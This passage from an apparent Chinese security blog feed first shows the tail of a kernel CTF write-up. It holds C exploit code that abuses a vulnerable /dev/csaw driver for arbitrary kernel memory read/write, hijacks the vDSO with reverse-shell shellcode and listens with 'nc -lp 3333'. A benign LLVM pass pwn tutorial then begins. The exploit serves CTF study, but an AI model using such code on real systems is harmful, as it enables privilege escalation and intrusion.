id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ((len / <span class="number">8</span>) * <span class="number">8</span>); i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%lx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i));</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_vdso_userspace</span><span class="params">(<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-]cannot get vdso addr&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = len; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, *(<span class="keyword">char</span> *)(addr + i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_vsdo_shellcode</span><span class="params">(<span class="keyword">char</span> *shellcode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;vdso:%lx\n&quot;</span>, addr);</span><br><span class="line"><span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-]cannot get vdso addr&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (memmem((<span class="keyword">char</span> *)addr, <span class="number">0x1000</span>, shellcode, <span class="built_in">strlen</span>(shellcode)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">char</span> *name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!vdso_addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line"><span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">size_t</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffffffff80000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">int</span> offset;</span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">&quot;\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05&quot;</span>;</span><br><span class="line">offset = get_gettimeofday_str_offset();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;gettimeofday str in vdso.so offset=0x%x\n&quot;</span>, offset);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line">prctl(PR_SET_NAME, target);</span><br><span class="line">fd = open(<span class="string">&quot;/dev/csaw&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] open error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] alloc_channel error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] now we get a channel %d\n&quot;</span>, alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span> + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any momery&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (; addr &lt; <span class="number">0xffffffffffffefff</span>; addr += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = addr - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);</span><br><span class="line"><span class="keyword">if</span> ((!<span class="built_in">strcmp</span>(<span class="string">&quot;gettimeofday&quot;</span>, buf + offset)))</span><br><span class="line">&#123;</span><br><span class="line">result = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found vdso %lx\n&quot;</span>, result);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;not found , try again &quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">ioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = result - <span class="number">0x10</span> + <span class="number">0xc80</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = shellcode;</span><br><span class="line">write_args.count = <span class="built_in">strlen</span>(shellcode);</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"><span class="keyword">if</span> (check_vsdo_shellcode(shellcode) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] shellcode is written into vdso, waiting for a reverse shell :&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;gettimeofday\n&quot;</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">void</span> (*gettimeofday_addr)();</span><br><span class="line">gettimeofday_addr = <span class="number">0xc80</span> + getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">gettimeofday_addr();</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;nc -lp 3333&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] someting wrong ... &quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">ioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp使用的shellcode为：<a class="link"   href="https://gist.github.com/itsZN/1ab36391d1849f15b785" >https://gist.github.com/itsZN/1ab36391d1849f15b785<i class="fas fa-external-link-alt"></i></a></p><hr><p>参考链接：<a class="link"   href="http://p4nda.top/2018/11/07/stringipc/#2-%E5%8A%AB%E6%8C%81VDSO" >http://p4nda.top/2018/11/07/stringipc/#2-%E5%8A%AB%E6%8C%81VDSO<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;分析通过内存任意读写到提升权限的三种方式&lt;/p&gt;
&lt;p&gt;在此之前呢，我所写的关于kernel的文章中适用到的提权方式基本都是通过&lt;code&gt;</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="修改cred，劫持vdso" scheme="https://cv196082.gitee.io/tags/%E4%BF%AE%E6%94%B9cred%EF%BC%8C%E5%8A%AB%E6%8C%81vdso/"/>
    
  </entry>
  
  <entry>
    <title>llvm pass pwn</title>
    <link href="https://cv196082.gitee.io/2022/07/27/llvm-pass-pwn/"/>
    <id>https://cv196082.gitee.io/2022/07/27/llvm-pass-pwn/</id>
    <published>2022-07-27T09:44:41.000Z</published>
    <updated>2022-07-27T10:02:30.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h2><p>首先呢，也是同其他博主一样，copy一下百度对于llvm的介绍：</p><p>LLVM是构架编译器的框架系统，以C++编写而成，用于优化以任意程序语言编写的程序的编译时间、链接时间、运行时间以及空闲时间，对开发者保持开放，并兼容已有脚本。</p><p>LLVM PASS是什么：<br>pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/llvm.jpg"                      alt="在这里插入图片描述"                ></p><p>首先我们的源代码会被clang编译器编译成一种中间代码——IR，它连接这编译器的前端和后端，IR的设计很大程度体现着LLVM插件化、模块化的设计哲学，LLVM的各种pass其实都是作用在LLVM IR上的。同时IR也是一个编译器组件接口。通常情况下，设计一门新的编程语言只需要完成能够生成LLVM IR的编译器前端即可，然后就可以轻松使用LLVM的各种编译优化、JIT支持、目标代码生成等功能。</p><h2 id="LLVM-IR"><a href="#LLVM-IR" class="headerlink" title="LLVM IR"></a>LLVM IR</h2><p>LLVM的IR的三种存在形式：</p><ol><li>内存格式，只保存在内存中，人无法看到</li><li>不可读的IR，被称作bitcode，文件后缀为bc</li><li>可读的IR，介于高级语言和汇编代码之间，文件后缀为ll</li></ol><p>大概就是说，LLVM提供了一种中间语言形式，以及编译链接这种语言的后端能力，那么对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力。而LLVM PASS就是去处理IR文件，通过opt利用写好的so库优化已有的IR，形成新的IR。而LLVM PASS类的pwn就是利用这一过程中可能会出现的漏洞。</p><p>从对应格式转化到另一格式的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c  =&gt; .ll: clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c  =&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll =&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc =&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc =&gt; .s : llc a.bc -o a.s</span><br></pre></td></tr></table></figure><p>首先呢，写一个简单的c语言程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> name[<span class="number">0x10</span>];</span><br><span class="line">   read(<span class="number">0</span>,name,<span class="number">0x10</span>);</span><br><span class="line">   write(<span class="number">1</span>,name,<span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;wow\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面所给的指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm -S test.c -o test.ll</span><br></pre></td></tr></table></figure><p>获得如下内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;test.c&#x27;</span></span><br><span class="line">target datalayout = <span class="string">&quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span></span><br><span class="line">target triple = <span class="string">&quot;x86_64-pc-linux-gnu&quot;</span></span><br><span class="line"></span><br><span class="line">@.str = <span class="keyword">private</span> unnamed_addr constant [<span class="number">5</span> x i8] c<span class="string">&quot;wow\0A\00&quot;</span>, align <span class="number">1</span></span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind uwtable</span><br><span class="line">define i32 @main() #<span class="number">0</span> &#123;</span><br><span class="line">  %name = alloca [<span class="number">16</span> x i8], align <span class="number">16</span></span><br><span class="line">  %<span class="number">1</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %name, i32 <span class="number">0</span>, i32 <span class="number">0</span></span><br><span class="line">  %<span class="number">2</span> = call i64 @read(i32 <span class="number">0</span>, i8* %<span class="number">1</span>, i64 <span class="number">16</span>)</span><br><span class="line">  %<span class="number">3</span> = getelementptr inbounds [<span class="number">16</span> x i8], [<span class="number">16</span> x i8]* %name, i32 <span class="number">0</span>, i32 <span class="number">0</span></span><br><span class="line">  %<span class="number">4</span> = call i64 @write(i32 <span class="number">1</span>, i8* %<span class="number">3</span>, i64 <span class="number">16</span>)</span><br><span class="line">  %<span class="number">5</span> = call i32 (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr inbounds ([<span class="number">5</span> x i8], [<span class="number">5</span> x i8]* @.str, i32 <span class="number">0</span>, i32 <span class="number">0</span>))</span><br><span class="line">  ret i32 <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare i64 @read(i32, i8*, i64) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">declare i64 @write(i32, i8*, i64) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">declare i32 @<span class="built_in">printf</span>(i8*, ...) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">attributes #<span class="number">0</span> = &#123; nounwind uwtable <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span>=<span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+fxsr,+mmx,+sse,+sse2&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line">attributes #<span class="number">1</span> = &#123; <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-frame-pointer-elim&quot;</span>=<span class="string">&quot;true&quot;</span> <span class="string">&quot;no-frame-pointer-elim-non-leaf&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;x86-64&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+fxsr,+mmx,+sse,+sse2&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">!llvm.ident = !&#123;!<span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line">!<span class="number">0</span> = !&#123;!<span class="string">&quot;clang version 3.8.0-2ubuntu4 (tags/RELEASE_380/final)&quot;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看见中间无论是申请变量还是调用函数还是可以很清晰的看出来的。</p><h2 id="LLVM-PASS"><a href="#LLVM-PASS" class="headerlink" title="LLVM PASS"></a>LLVM PASS</h2><p>官方文档的一个实例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="keyword">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure><p>该示例用于遍历IR中的函数，因此结构体<code>Hello</code>继承了<code>FunctionPass</code>，并重写了<code>runOnFunction</code>函数，那么每遍历到一个函数时，<code>runOnFunction</code>都会被调用，因此该程序会输出函数名。我们需要将其编译为模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared test.cpp -o test.so `llvm-config --ldflags`</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tcdy@ubuntu:~$ opt -load ./test.so -hello ./test.ll</span><br><span class="line">WARNING: You<span class="string">&#x27;re attempting to print out a bitcode file.</span></span><br><span class="line"><span class="string">This is inadvisable as it may cause display problems. If</span></span><br><span class="line"><span class="string">you REALLY want to taste LLVM bitcode first-hand, you</span></span><br><span class="line"><span class="string">can force output with the `-f&#x27;</span> option.</span><br><span class="line"></span><br><span class="line">Hello: main</span><br></pre></td></tr></table></figure><p>上面以我们刚刚的IR为例，-hellow是注册的名字</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>最后打印出来函数名字</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Pass.h&quot;</span></span></span><br><span 